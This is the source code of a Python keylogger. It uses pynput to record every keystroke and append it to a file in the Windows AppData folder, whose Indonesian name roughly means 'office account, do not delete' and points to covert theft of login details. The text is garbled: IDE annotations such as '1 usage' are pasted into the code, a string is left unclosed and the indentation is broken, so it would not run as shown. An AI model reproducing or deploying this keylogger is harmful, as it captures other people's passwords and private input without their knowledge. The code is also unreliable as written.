import os
from pynput.keyboard import Listener

keys = []
count = 0
path = os.environ['appdata'] + '\\AKUNOFFICEJANGANHAPUS.txt'

#path = 'testificate.txt

def on_press(key): 1 usage
  global keys,count
  keys.append(key)
  count += 1

  if count >= 1:
    count = 0
    write_file(keys)
    keys = []

def write_file(keys): 1 usage
  with open(path, 'a') as f:
    for key in keys:
      k = str(key).replace(_old: "", _new)
      if k.find('backspace') > 0:
        f.write(' backspace' )
      elif k.find('enter') > 0:
        f.write('\n')
      elif k.find('shift') > 0:
        f.write(' Shift')
      elif k.find('space') >0:
        f.write('')
      elif k.find('caps_lock') > 0:
        f.write(' caps_lock')
      elif k.find('Key'):
        f.write(k)

with Listener(on_press=on_press) as listener:
listener.join()

